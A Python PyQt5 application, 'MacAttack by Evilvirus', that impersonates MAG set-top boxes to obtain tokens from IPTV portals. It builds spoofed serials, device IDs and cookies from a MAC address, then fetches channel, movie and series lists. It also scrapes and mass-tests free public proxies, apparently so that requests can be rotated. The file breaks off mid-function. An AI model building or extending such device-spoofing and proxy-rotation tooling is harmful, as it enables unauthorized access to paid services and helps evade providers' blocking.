import hashlib
import os
import time
import re
import json
import random
import threading
from threading import Lock
from datetime import datetime
import sys
import vlc
import base64
from PyQt5.QtCore import QEvent,QByteArray, QBuffer, Qt, QThread, pyqtSignal, QPropertyAnimation, QEasingCurve, QTimer
from PyQt5.QtGui import QFont, QPixmap, QIcon, QStandardItemModel, QStandardItem, QMouseEvent
from PyQt5.QtWidgets import QSlider, QMainWindow, QFrame, QApplication, QVBoxLayout, QLineEdit, QLabel, QPushButton, QWidget, QTabWidget, QMessageBox, QListView, QHBoxLayout, QCheckBox, QAbstractItemView, QProgressBar, QSpinBox, QTextEdit, QSpacerItem, QSizePolicy
import requests
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
from urllib.parse import quote, urlparse, urlunparse
import configparser
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

logging.basicConfig(level=logging.DEBUG)

def get_token(session, url, mac_address):
    try:
        handshake_url = f"{url}/portal.php?type=stb&action=handshake&JsHttpRequest=1-xml"

        #convert the mac into various hashes, if anything this will add randomness to the requests
        mac_md5 = hashlib.md5(mac_address.encode('utf-8')).hexdigest().upper()
        mac_sha256 = hashlib.sha256(mac_address.encode('utf-8')).hexdigest().upper()
        mac_sha1 = hashlib.sha1(mac_address.encode('utf-8')).hexdigest()

        
        serial = mac_md5 #cant be right, looks like the serial is only supposed to be 13 digits from what i am reading
        device_id = mac_sha256
        device_id2_input = serial[:13] + mac_address  # Combine first 13 digits of MD5 + MAC
        device_id2 = hashlib.sha256(device_id2_input.encode('utf-8')).hexdigest().upper()  # SHA256 of the combined input

        cookies = {           
            "adid": mac_sha1,
            "debug": "1",
            "device_id2": device_id2,
            "device_id": device_id,
            "hw_version": "1.7-BD-00",
            "mac": mac_address,
            "sn": serial[:13], #cut to 13 digits
            "stb_lang": "en",
            "timezone": "America/Los_Angeles",             
        }
        
        headers = {"User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C)"}
        response = session.get(handshake_url, cookies=cookies, headers=headers, timeout=20)
        response.raise_for_status()
        token = response.json().get("js", {}).get("token")
        if token:
            logging.debug(f"Token retrieved: {token}")
            return token
        else:
            logging.error("Token not found in handshake response.")
            return None
    except Exception as e:
        logging.error(f"Error getting token: {e}")
        return None

class ProxyFetcher(QThread):
    # Define the signal correctly
    update_proxy_output_signal = pyqtSignal(str)  # Ensure this signal is defined
    update_proxy_textbox_signal = pyqtSignal(str)  # Another signal to update UI with results

    def __init__(self):
        super().__init__()
        self.proxy_fetching_speed = 100  # default fetching speed
        self.proxy_testing_speed = 200   # default testing speed

    def run(self):
        self.fetch_and_test_proxies()

    def fetch_and_test_proxies(self):
        # Fetch proxies concurrently
        all_proxies = self.fetch_proxies()

        if not all_proxies:
            self.update_proxy_output_signal.emit("No proxies found, check internet connection.")
            return

        original_count = len(all_proxies)
        all_proxies = list(set(all_proxies))  # Remove duplicates
        duplicates_removed = original_count - len(all_proxies)
        self.update_proxy_output_signal.emit(f"Total proxies fetched: {original_count}\n")
        self.update_proxy_output_signal.emit(f"Duplicates removed: {duplicates_removed}\n")

        # Test proxies concurrently using the testing speed
        working_proxies = []
        self.update_proxy_output_signal.emit("Testing proxies...")

        # Increase `max_workers` for faster testing
        with ThreadPoolExecutor(max_workers=self.proxy_testing_speed) as executor:
            future_to_proxy = {executor.submit(self.test_proxy, proxy): proxy for proxy in all_proxies}
            for future in as_completed(future_to_proxy):
                proxy = future_to_proxy[future]
                try:
                    proxy, is_working = future.result()
                    if is_working:
                        self.update_proxy_output_signal.emit(f"Proxy {proxy} is working.")
                        working_proxies.append(proxy)
                    else:
                        self.update_proxy_output_signal.emit(f"Proxy {proxy} failed.")
                except Exception as e:
                    logging.debug(f"Error testing proxy {proxy}: {str(e)}")

        if working_proxies:
            self.update_proxy_textbox_signal.emit("\n".join(working_proxies))
            self.update_proxy_output_signal.emit("Done!")
        else:
            self.update_proxy_output_signal.emit("No working proxies found.")

    def fetch_proxies(self):
        proxies = []
        sources = [
            "https://spys.me/proxy.txt",
            "https://free-proxy-list.net/",
            "https://www.sslproxies.org/",
            "https://www.freeproxy.world/?type=http&anonymity=&country=&speed=&port=&page=1"
        ]

        # Use the proxy fetching speed for concurrent fetching
        with ThreadPoolExecutor(max_workers=self.proxy_fetching_speed) as executor:
            futures = {executor.submit(self.fetch_from_source, url): url for url in sources}
            for future in as_completed(futures):
                source_url = futures[future]
                try:
                    source_proxies = future.result()
                    proxies.extend(source_proxies)
                except Exception as e:
                    self.update_proxy_output_signal.emit(f"Error fetching from {source_url}: {e}")

        return proxies

    def fetch_from_source(self, url):
        """
        Fetch proxies from a given URL.
        """
        proxies = []
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                if 'spys.me' in url:
                    regex = r"[0-9]+(?:\.[0-9]+){3}:[0-9]+"
                    matches = re.finditer(regex, response.text, re.MULTILINE)
                    proxies.extend([match.group() for match in matches])
                elif 'free-proxy-list.net' in url:
                    html_content = response.text
                    ip_port_pattern = re.compile(r"<td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td>")
                    matches = ip_port_pattern.findall(html_content)
                    proxies.extend([f"{ip}:{port}" for ip, port in matches])
                elif 'sslproxies.org' in url:
                    html_content = response.text
                    ip_port_pattern = re.compile(r"<td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td>")
                    matches = ip_port_pattern.findall(html_content)
                    proxies.extend([f"{ip}:{port}" for ip, port in matches])
                elif 'freeproxy.world' in url:
                    html_content = response.text
                    ip_port_pattern = re.compile(
                        r'<td class="show-ip-div">\s*(\d+\.\d+\.\d+\.\d+)\s*</td>\s*'
                        r'<td>\s*<a href=".*?">(\d+)</a>\s*</td>'
                    )
                    matches = ip_port_pattern.findall(html_content)
                    proxies.extend([f"{ip}:{port}" for ip, port in matches])
        except requests.exceptions.RequestException as e:
            logging.debug(f"Error fetching from {url}: {e}")
        return proxies

    def test_proxy(self, proxy):
        """
        Tests if the given proxy is working by making a request to a test site.
        """
        url = "http://httpbin.org/ip"  # This site will return your IP as seen by the server
        proxies = {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        }
        try:
            response = requests.get(url, proxies=proxies, timeout=10)
            if response.status_code == 200:
                return proxy, True
        except requests.RequestException as e:
            logging.debug(f"Error testing proxy {proxy}: {str(e)}")
        return proxy, False

class RequestThread(QThread):
    request_complete = pyqtSignal(dict)  # Signal emitted when the request is complete
    update_progress = pyqtSignal(int)  # Signal for progress updates
    channels_loaded = pyqtSignal(list)  # Signal emitted when channels are loaded
    
    def __init__(self, base_url, mac_address, category_type=None, category_id=None):
        super().__init__()
        self.base_url = base_url
        self.mac_address = mac_address
        self.category_type = category_type
        self.category_id = category_id

    def run(self):
        try:
            # Check if the thread is interrupted at the start
            if self.isInterruptionRequested():
                logging.debug("RequestThread was interrupted at the start.")
                self.request_complete.emit({})
                return

            logging.debug("RequestThread started.")
            session = requests.Session()
            adapter = HTTPAdapter(pool_connections=10, pool_maxsize=10)
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            token = self.get_token(session, self.base_url, self.mac_address)

            if self.isInterruptionRequested():
                logging.debug("RequestThread was interrupted after token retrieval.")
                self.request_complete.emit({})
                return

            if token:
                if self.category_type and self.category_id:
                    self.update_progress.emit(1)  # Indicating token retrieval is complete
                    channels = self.get_channels(session, self.base_url, self.mac_address, token, self.category_type, self.category_id)
                    
                    if self.isInterruptionRequested():
                        logging.debug("RequestThread was interrupted while fetching channels.")
                        self.request_complete.emit({})
                        return
                    
                    self.update_progress.emit(100)
                    self.channels_loaded.emit(channels)
                else:
                    self.fetch_and_emit_playlist_data(session, token)
            else:
                self.request_complete.emit({})  # Emit empty data if token retrieval fails
                self.update_progress.emit(0)

        except Exception as e:
            logging.error(f"Error in thread: {e}")
        finally:
            logging.debug("Thread cleanup complete.")
            
    def requestInterruption(self):
        # Request to interrupt the thread
        super().requestInterruption()

    def fetch_and_emit_playlist_data(self, session, token):
        # Simulate fetching playlist data
        data = {"Live": [], "Movies": [], "Series": []}

        # Fetch genres for the Live tab
        self.update_progress.emit(1)
        genres = self.get_genres(session, self.base_url, self.mac_address, token)
        if genres:
            data["Live"].extend(genres)
        else:
            self.update_progress.emit(0)
            return

        # Update progress after fetching genres
        self.update_progress.emit(40)

        # Fetch VOD categories for the Movies tab
        vod_categories = self.get_vod_categories(session, self.base_url, self.mac_address, token)
        if vod_categories:
            data["Movies"].extend(vod_categories)

        # Update progress after fetching VOD categories
        self.update_progress.emit(70)

        # Fetch Series categories for the Series tab
        series_categories = self.get_series_categories(session, self.base_url, self.mac_address, token)
        if series_categories:
            data["Series"].extend(series_categories)

        # Final progress update
        self.update_progress.emit(100)
        # Emit the completed data
        self.request_complete.emit(data)

    def get_token(self, session, url, mac_address):
        try:
            handshake_url = f"{url}/portal.php?type=stb&action=handshake&JsHttpRequest=1-xml"

            #convert the mac into various hashes, if anything this will add randomness to the requests
            mac_md5 = hashlib.md5(mac_address.encode('utf-8')).hexdigest().upper()
            mac_sha256 = hashlib.sha256(mac_address.encode('utf-8')).hexdigest().upper()
            mac_sha1 = hashlib.sha1(mac_address.encode('utf-8')).hexdigest()

            
            serial = mac_md5 #cant be right, looks like the serial is only supposed to be 13 digits from what i am reading
            device_id = mac_sha256
            device_id2_input = serial[:13] + mac_address  # Combine first 13 digits of MD5 + MAC
            device_id2 = hashlib.sha256(device_id2_input.encode('utf-8')).hexdigest().upper()  # SHA256 of the combined input


            cookies = {           
                "adid": mac_sha1,
                "debug": "1",
                "device_id2": device_id2,
                "device_id": device_id,
                "hw_version": "1.7-BD-00",
                "mac": mac_address,
                "sn": serial[:13], #cut to 13 digits
                "stb_lang": "en",
                "timezone": "America/Los_Angeles",             
            }

            headers = {"User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C)"}
            response = session.get(handshake_url, cookies=cookies, headers=headers, timeout=20)
            response.raise_for_status()
            token = response.json().get("js", {}).get("token")
            if token:
                logging.debug(f"Token retrieved: {token}")
                return token
            else:
                logging.error("Token not found in handshake response.")
                return None
        except Exception as e:
            logging.error(f"Error getting token: {e}")
            return None

    def get_genres(self, session, url, mac_address, token):
        try:
            genres_url = f"{url}/portal.php?type=itv&action=get_genres&JsHttpRequest=1-xml"

            #convert the mac into various hashes, if anything this will add randomness to the requests
            mac_md5 = hashlib.md5(mac_address.encode('utf-8')).hexdigest().upper()
            mac_sha256 = hashlib.sha256(mac_address.encode('utf-8')).hexdigest().upper()
            mac_sha1 = hashlib.sha1(mac_address.encode('utf-8')).hexdigest()

            
            serial = mac_md5 #cant be right, looks like the serial is only supposed to be 13 digits from what i am reading
            device_id = mac_sha256
            device_id2_input = serial[:13] + mac_address  # Combine first 13 digits of MD5 + MAC
            device_id2 = hashlib.sha256(device_id2_input.encode('utf-8')).hexdigest().upper()  # SHA256 of the combined input

            cookies = {           
                "adid": mac_sha1,
                "debug": "1",
                "device_id2": device_id2,
                "device_id": device_id,
                "hw_version": "1.7-BD-00",
                "mac": mac_address,
                "sn": serial[:13], #cut to 13 digits
                "stb_lang": "en",
                "timezone": "America/Los_Angeles",             
            }

            headers = {
                "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
                "Authorization": f"Bearer {token}",
                "X-User-Agent": "Model: MAG250; Link: WiFi",
            }
            response = session.get(genres_url, cookies=cookies, headers=headers, timeout=20)
            response.raise_for_status()
            genre_data = response.json().get("js", [])
            if genre_data:
                genres = [
                    {
                        "name": i["title"],
                        "category_type": "IPTV",
                        "category_id": i["id"],
                    }
                    for i in genre_data
                ]
                logging.debug(f"Genres fetched: {genres}")
                return genres
            else:
                logging.warning("No genres data found.")
                self.request_complete.emit({})  # Emit empty data if no genres are found
                return []
        except Exception as e:
            logging.error(f"Error getting genres: {e}")
            self.error_label.setText("502, Server Error")
            self.error_label.setVisible(True)
            return []

    def get_vod_categories(self, session, url, mac_address, token):
        try:
            vod_url = f"{url}/portal.php?type=vod&action=get_categories&JsHttpRequest=1-xml"

            #convert the mac into various hashes, if anything this will add randomness to the requests
            mac_md5 = hashlib.md5(mac_address.encode('utf-8')).hexdigest().upper()
            mac_sha256 = hashlib.sha256(mac_address.encode('utf-8')).hexdigest().upper()
            mac_sha1 = hashlib.sha1(mac_address.encode('utf-8')).hexdigest()

            
            serial = mac_md5 #cant be right, looks like the serial is only supposed to be 13 digits from what i am reading
            device_id = mac_sha256
            device_id2_input = serial[:13] + mac_address  # Combine first 13 digits of MD5 + MAC
            device_id2 = hashlib.sha256(device_id2_input.encode('utf-8')).hexdigest().upper()  # SHA256 of the combined input

            cookies = {           
                "adid": mac_sha1,
                "debug": "1",
                "device_id2": device_id2,
                "device_id": device_id,
                "hw_version": "1.7-BD-00",
                "mac": mac_address,
                "sn": serial[:13], #cut to 13 digits
                "stb_lang": "en",
                "timezone": "America/Los_Angeles",             
            }

            headers = {
                "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
                "Authorization": f"Bearer {token}",
                "X-User-Agent": "Model: MAG250; Link: WiFi",
            }
            response = session.get(vod_url, cookies=cookies, headers=headers, timeout=20)
            response.raise_for_status()
            categories_data = response.json().get("js", [])
            if categories_data:
                categories = [
                    {
                        "name": category["title"],
                        "category_type": "VOD",
                        "category_id": category["id"],
                    }
                    for category in categories_data
                ]
                logging.debug(f"VOD categories fetched: {categories}")
                return categories
            else:
                logging.warning("No VOD categories data found.")
                return []
        except Exception as e:
            logging.error(f"Error getting VOD categories: {e}")
            return []

    def get_series_categories(self, session, url, mac_address, token):
        try:
            series_url = f"{url}/portal.php?type=series&action=get_categories&JsHttpRequest=1-xml"

            #convert the mac into various hashes, if anything this will add randomness to the requests
            mac_md5 = hashlib.md5(mac_address.encode('utf-8')).hexdigest().upper()
            mac_sha256 = hashlib.sha256(mac_address.encode('utf-8')).hexdigest().upper()
            mac_sha1 = hashlib.sha1(mac_address.encode('utf-8')).hexdigest()

            
            serial = mac_md5 #cant be right, looks like the serial is only supposed to be 13 digits from what i am reading
            device_id = mac_sha256
            device_id2_input = serial[:13] + mac_address  # Combine first 13 digits of MD5 + MAC
            device_id2 = hashlib.sha256(device_id2_input.encode('utf-8')).hexdigest().upper()  # SHA256 of the combined input

            cookies = {           
                "adid": mac_sha1,
                "debug": "1",
                "device_id2": device_id2,
                "device_id": device_id,
                "hw_version": "1.7-BD-00",
                "mac": mac_address,
                "sn": serial[:13], #cut to 13 digits
                "stb_lang": "en",
                "timezone": "America/Los_Angeles",             
            }

            headers = {
                "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
                "Authorization": f"Bearer {token}",
                "X-User-Agent": "Model: MAG250; Link: WiFi",
            }
            response = session.get(series_url, cookies=cookies, headers=headers, timeout=20)
            response.raise_for_status()
            response_json = response.json()
            logging.debug(f"Series categories response: {response_json}")
            if not isinstance(response_json, dict) or "js" not in response_json:
                logging.error("Unexpected response structure for series categories.")
                return []

            categories_data = response_json.get("js", [])
            categories = [
                {
                    "name": category["title"],
                    "category_type": "Series",
                    "category_id": category["id"],
                }
                for category in categories_data
            ]
            logging.debug(f"Series categories fetched: {categories}")
            return categories
        except Exception as e:
            logging.error(f"Error getting series categories: {e}")
            return []

    def get_channels(self, session, url, mac_address, token, category_type, category_id):
        try:
            channels = []

            #convert the mac into various hashes, if anything this will add randomness to the requests
            mac_md5 = hashlib.md5(mac_address.encode('utf-8')).hexdigest().upper()
            mac_sha256 = hashlib.sha256(mac_address.encode('utf-8')).hexdigest().upper()
            mac_sha1 = hashlib.sha1(mac_address.encode('utf-8')).hexdigest()

            
            serial = mac_md5 #cant be right, looks like the serial is only supposed to be 13 digits from what i am reading
            device_id = mac_sha256
            device_id2_input = serial[:13] + mac_address  # Combine first 13 digits of MD5 + MAC
            device_id2 = hashlib.sha256(device_id2_input.encode('utf-8')).hexdigest().upper()  # SHA256 of the combined input

            cookies = {           
                "adid": mac_sha1,
                "debug": "1",
                "device_id2": device_id2,
                "device_id": device_id,
                "hw_version": "1.7-BD-00",
                "mac": mac_address,
                "sn": serial[:13], #cut to 13 digits
                "stb_lang": "en",
                "timezone": "America/Los_Angeles",             
            }

            headers = {
                "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
                "Authorization": f"Bearer {token}",
                "X-User-Agent": "Model: MAG250; Link: WiFi",
            }

            def fetch_page(page_number):
                # Build URL based on the category type
                if category_type == "IPTV":
                    channels_url = f"{url}/portal.php?type=itv&action=get_ordered_list&genre={category_id}&JsHttpRequest=1-xml&p={page_number}"
                elif category_type == "VOD":
                    channels_url = f"{url}/portal.php?type=vod&action=get_ordered_list&category={category_id}&JsHttpRequest=1-xml&p={page_number}"
                elif category_type == "Series":
                    channels_url = f"{url}/portal.php?type=series&action=get_ordered_list&category={category_id}&p={page_number}&JsHttpRequest=1-xml"
                else:
                    logging.error(f"Unknown category_type: {category_type}")
                    return []

                retries = 3
                for attempt in range(retries):
                    try:
                        logging.debug(f"Fetching channels from URL: {channels_url}")
                        response = session.get(channels_url, cookies=cookies, headers=headers, timeout=20)
                        if response.status_code == 200:
                            channels_data = response.json().get("js", {}).get("data", [])
                            for channel in channels_data:
                                channel["item_type"] = (
                                    "series"
                                    if category_type == "Series"
                                    else "vod"
                                    if category_type == "VOD"
                                    else "channel"
                                )
                            return channels_data, response.json().get("js", {}).get("total_items", 0)
                        else:
                            logging.debug(f"Error {response.status_code} - Retrying")
                            logging.error(f"Request failed for page {page_number} with status code {response.status_code}")
                    except requests.RequestException as e:
                        logging.debug(f"Request failed due to {e} - Retrying")
                        logging.error(f"Exception occurred during request: {e}")
                        break
                return [], 0

            # Initial fetch to get the total number of items
            first_page_data, total_items = fetch_page(1)
            if total_items == 0:
                logging.debug("No items found.")
                return []

            channels.extend(first_page_data)

            # Calculate total pages based on total_items
            pages_to_fetch = (total_items // 10) + (1 if total_items % 10 != 0 else 0)

            logging.debug(f"Total pages to fetch: {pages_to_fetch} (based on {total_items} total items)")

            # Emit initial progress
            self.update_progress.emit(1)

            # Fetch remaining pages in parallel
            with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
                page_numbers = range(2, pages_to_fetch + 1)
                results = executor.map(fetch_page, page_numbers)

                total_fetched = len(first_page_data)
                for i, (result, _) in enumerate(results, start=2):  # Start from page 2, we already have page 1
                    if result:
                        channels.extend(result)
                        total_fetched += len(result)

                    # Emit progress after each page
                    progress = int((total_fetched / total_items) * 100)
                    self.update_progress.emit(progress)

            # Final progress update
            self.update_progress.emit(100)

            logging.debug(f"Total channels fetched: {len(channels)}")
            return channels

        except Exception as e:
            logging.error(f"An error occurred while retrieving channels: {str(e)}")
            return []
       
class VideoPlayerWorker(QThread):
    # Signal to emit stream URL when the request is successful
    stream_url_ready = pyqtSignal(str)
    # Signal to emit error message if the request fails
    error_occurred = pyqtSignal(str)

    def __init__(self, stream_url):
        super().__init__()
        self.stream_url = stream_url
        self.session = requests.Session()

    def run(self):
        try:
            # Set a timeout to prevent hanging requests
            timeout = 10  # seconds
            response = self.session.get(self.stream_url, timeout=timeout)
            
            if response.status_code == 200:
                # Emit the final stream URL if successful
                self.stream_url_ready.emit(response.url)
            else:
                # Emit error if the request fails
                error_message = f"Failed to load, {response.status_code}"
                self.error_occurred.emit(error_message)
        except requests.Timeout:
            # Handle request timeout
            self.error_occurred.emit("Request timed out")
        except requests.ConnectionError:
            # Handle connection issues (e.g., no internet connection)
            self.error_occurred.emit("Connection error.")
        except Exception as e:
            # Emit error for any other unexpected issues
            if not "IncompleteRead" in str(e):
                self.error_occurred.emit(f"Error: {str(e)}")
            
class MacAttack(QMainWindow):
    update_mac_label_signal = pyqtSignal(str)
    update_output_text_signal = pyqtSignal(str)
    update_error_text_signal = pyqtSignal(str)
    macattack_update_proxy_textbox_signal = pyqtSignal(str)  # macattack clean bad proxies
    
    proxies_fetched_signal = pyqtSignal(str)  # Signal to send fetched proxies to the UI
    working_proxies_signal = pyqtSignal(str)  # Signal to send working proxies to the UI
    error_signal = pyqtSignal(str)  # Signal to send errors to the UI
    output_signal = pyqtSignal(str)  # Signal to send print output to QTextEdit

    def __init__(self):
        super().__init__()

        self.proxy_error_counts = {}
        self.lock = Lock()  # For synchronizing file writes
        self.threads = []   # To track background threads


        # Initial VLC instance 
        referer_url = "https://evilvir.us" #this gets replaced when a host is entered into the box, just initializing it
        if getattr(sys, 'frozen', False):
            base_path = sys._MEIPASS
        else:
            base_path = os.path.abspath(".")        
        self.instance = vlc.Instance(
            [
                f'--config={base_path}\\include\\vlcrc', #config file holding the proxy info
                '--repeat',                     # keep connected if kicked off
                '--no-xlib',                     # Keep it quiet in X11 environments.
                '--vout=directx',                # DirectX for the win (Windows specific).
                '--no-plugins-cache',            # Cache is for the weak.
                '--log-verbose=1'                # We like it chatty in the logs.
            ]
        )
        self.videoPlayer = self.instance.media_player_new()
        
        self.set_window_icon()
        self.setWindowTitle("MacAttack by Evilvirus")
        self.setGeometry(200, 200, 1138, 522)
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.Window)

        self.running = False
        self.threads = []
        self.output_file = None
        self.video_worker = None  # Initialize to None
        self.current_request_thread = None  # Initialize here
        

        # Initialize ProxyFetcher thread
        self.proxy_fetcher = ProxyFetcher()
        # Connect signals from ProxyFetcher to update the UI
        self.proxy_fetcher.update_proxy_output_signal.connect(self.update_proxy_output)
        self.proxy_fetcher.update_proxy_textbox_signal.connect(self.update_proxy_textbox)
        self.macattack_update_proxy_textbox_signal.connect(self.macattack_update_proxy_textbox)

        QApplication.setStyle("Fusion")

        theme = """
        QWidget {
            background-color: #2e2e2e;
            color: white;
            font-size: 10pt;
        }

        QLineEdit, QPushButton, QTabWidget {
            background-color: #444444;
            color: white;
            border: 0px solid #666666;
            padding: 5px;
            border-radius: 3px;
        }

        QLineEdit:focus, QPushButton:pressed {
            background-color: #666666;
        }

        QTabBar::tab {
            background-color: #444444;
            color: white;
            padding-top: 5px;
            padding-right: 5px;
            padding-bottom: 5px;
            padding-left: 5px;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
            border-bottom-left-radius: 0px;
            border-bottom-right-radius: 0px;
        }

        QTabBar::tab:selected {
            background-color: #666666;
        }

        QProgressBar {
            text-align: center;
            color: white;
            background-color: #555555;
        }

        QProgressBar::chunk {
            background-color: #1e90ff;
        }        
        QCheckBox {
            background-color: #666666;
            padding: 5px;
            border: 2px solid black;
        }
        QCheckBox:checked {
            background-color: green;
        }                
        """
        self.setStyleSheet(theme)

        # Main layout
        self.central_widget = QWidget(self)
        self.setCentralWidget(self.central_widget)
        self.main_layout = QVBoxLayout(self.central_widget)
        self.main_layout.setContentsMargins(0, 0, 0, 0)
        self.main_layout.setSpacing(0)

        # Top bar layout
        self.topbar_layout = QHBoxLayout()  # Create a horizontal layout
        self.topbar_layout.setContentsMargins(30, 5, 0, 0)
        self.topbar_layout.setSpacing(0)

        # Create the tabs (Top-level tabs)
        self.tabs = QTabWidget(self)  # This is for the "Mac Attack" and "Mac VideoPlayer" tabs
        self.topbar_layout.addWidget(self.tabs)

        # Create a minimize button with a "-" label
        self.topbar_minimize_button = QPushButton("-")
        self.topbar_minimize_button.setFixedSize(20, 20)  # size adjustment
        self.topbar_minimize_button.clicked.connect(self.showMinimized)  # Connect to minimize the app

        # Create a close button with "X"
        self.topbar_close_button = QPushButton("X")
        self.topbar_close_button.setFixedSize(20, 20)  # size adjustment
        self.topbar_close_button.clicked.connect(self.close)  # Connect to close the app

        # Add buttons to the layout with appropriate alignment
        self.topbar_layout.addWidget(self.topbar_minimize_button, alignment=Qt.AlignTop | Qt.AlignRight)
        self.topbar_layout.addWidget(self.topbar_close_button, alignment=Qt.AlignTop | Qt.AlignRight)

        # Add top bar layout to the main layout
        self.main_layout.addLayout(self.topbar_layout)

        # Create the tabs content
        self.mac_attack_frame = QWidget()
        self.build_mac_attack_gui(self.mac_attack_frame)
        self.tabs.addTab(self.mac_attack_frame, "Mac Attack")

        self.mac_videoPlayer_frame = QWidget()
        self.build_mac_videoPlayer_gui(self.mac_videoPlayer_frame)
        self.tabs.addTab(self.mac_videoPlayer_frame, "Mac VideoPlayer")

        self.Proxy_frame = QWidget()
        self.build_Proxy_gui(self.Proxy_frame)
        self.tabs.addTab(self.Proxy_frame, "Proxies")

        self.Settings_frame = QWidget()
        self.build_Settings_gui(self.Settings_frame)
        self.tabs.addTab(self.Settings_frame, "Settings")

        # Bottom bar layout
        self.bottombar_layout = QHBoxLayout()  # Create a horizontal layout
        self.bottombar_layout.setContentsMargins(0, 30, 0, 0)
        self.bottombar_layout.setSpacing(0)

        # Add bottom bar layout to the main layout
        self.main_layout.addLayout(self.bottombar_layout)

        self.load_settings()

        # Connect the signals to their respective update methods
        self.update_mac_label_signal.connect(self.update_mac_label)
        self.update_output_text_signal.connect(self.update_output_text)
        self.update_error_text_signal.connect(self.update_error_text)
        self.tabs.currentChanged.connect(self.on_tab_change)

        # Make the window resizable by adding a mouse event handler
        self.setMouseTracking(True)
        self.setAttribute(Qt.WA_OpaquePaintEvent)
        self.resizing = False
        self.moving = False
        self.resize_start_pos = None
        self.move_start_pos = None 

        if self.tabs.currentIndex() == 1:  # Ensure we're on the Mac VideoPlayer tab
            self.videoPlayer.play()  # Play the video

    def build_mac_videoPlayer_gui(self, parent):
        # Central widget for the "Mac VideoPlayer" tab
        central_widget = QWidget(self)
        parent.setLayout(QVBoxLayout())  # Set layout for the parent widget
        parent.layout().setContentsMargins(0, 0, 0, 0)
        parent.layout().setSpacing(0)
        parent.layout().addWidget(central_widget)

        # Main layout with two sections: left (controls) and right (video + buttons)
        main_layout = QHBoxLayout(central_widget)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(10) 

        # LEFT SECTION: Controls and other widgets
        self.left_layout = QVBoxLayout()
        self.left_layout.setContentsMargins(0, 0, 0, 0)
        self.left_layout.setSpacing(10)
        self.left_layout.addSpacing(15)  # Adds space
        # Hostname label and input horizontally aligned
        self.hostname_layout = QHBoxLayout()  # Create a horizontal layout
        self.hostname_layout.setContentsMargins(0, 0, 0, 0)
        self.hostname_layout.setSpacing(0)
        
        self.hostname_label = QLabel("Host:")
        self.hostname_layout.addWidget(self.hostname_label)
        self.hostname_input = QLineEdit()
        self.hostname_layout.addWidget(self.hostname_input)
        self.left_layout.addLayout(self.hostname_layout)

        self.mac_layout = QHBoxLayout()
        self.mac_layout.setContentsMargins(0, 0, 0, 0)
        self.mac_layout.setSpacing(0)
        self.mac_label = QLabel("MAC:")
        self.mac_layout.addWidget(self.mac_label)
        self.mac_input = QLineEdit()
        self.mac_layout.addWidget(self.mac_input)
        self.left_layout.addLayout(self.mac_layout)

        self.playlist_layout = QHBoxLayout()
        self.playlist_layout.setContentsMargins(0, 0, 0, 0)
        self.playlist_layout.setSpacing(0)
        self.spacer = QSpacerItem(30, 0, QSizePolicy.Fixed, QSizePolicy.Minimum)       
        self.playlist_layout.addItem(self.spacer) 

        # Proxy input layout
        self.proxy_layout = QHBoxLayout()
        self.proxy_layout.setContentsMargins(0, 0, 0, 0)
        self.proxy_layout.setSpacing(0)
        self.proxy_label = QLabel("Proxy:")
        self.proxy_layout.addWidget(self.proxy_label)
        self.proxy_input = QLineEdit()
        self.proxy_input.setPlaceholderText("Optional")
        self.proxy_layout.addWidget(self.proxy_input)
        self.left_layout.addLayout(self.proxy_layout)

        self.get_playlist_button = QPushButton("Get Playlist")
        self.playlist_layout.addWidget(self.get_playlist_button)
        self.get_playlist_button.clicked.connect(self.get_playlist)
        
        self.left_layout.addLayout(self.playlist_layout)

        # I got smarter, and put it on video load
        # Connect host and proxy input change to proxy update
        self.proxy_input.textChanged.connect(self.update_proxy)
        #self.hostname_input.textChanged.connect(self.update_proxy)

        # Add the search input field above the tabs
        self.search_input = QLineEdit(self)
        self.search_input.setPlaceholderText("Filter Playlist...")
        self.search_input.textChanged.connect(self.filter_playlist)  # Connect to the filtering function
        self.left_layout.addWidget(self.search_input, alignment=Qt.AlignLeft)

        # Create a QTabWidget (for "Live", "Movies", "Series")
        self.tab_widget = QTabWidget()
        self.left_layout.addWidget(self.tab_widget)

        # Dictionary to hold tab data
        self.tab_data = {}

        for tab_name in ["Live", "Movies", "Series"]:
            tab = QWidget()
            tab_layout = QVBoxLayout(tab)
            tab_layout.setContentsMargins(0, 0, 0, 0)
            tab_layout.setSpacing(0)
            playlist_view = QListView()
            playlist_view.setEditTriggers(QAbstractItemView.NoEditTriggers)
            tab_layout.addWidget(playlist_view)

            self.playlist_model = QStandardItemModel(playlist_view)
            playlist_view.setModel(self.playlist_model)

            playlist_view.scrollToTop()  # Scroll the view to the top

            playlist_view.doubleClicked.connect(self.on_playlist_selection_changed)
            self.tab_widget.addTab(tab, tab_name)

            self.tab_data[tab_name] = {
                "tab_widget": tab,
                "playlist_view": playlist_view,
                "self.playlist_model": self.playlist_model,
                "current_category": None,
                "navigation_stack": [],
                "playlist_data": [],
                "current_channels": [],
                "current_series_info": [],
                "current_view": "categories",
            }

        # Progress bar at the bottom
        self.progress_layout = QHBoxLayout()
        self.progress_layout.setContentsMargins(0, 0, 0, 0)
        self.progress_layout.setSpacing(0)
        self.progress_bar = QProgressBar()
        self.progress_bar.setValue(0)
        self.progress_layout.addWidget(self.progress_bar)
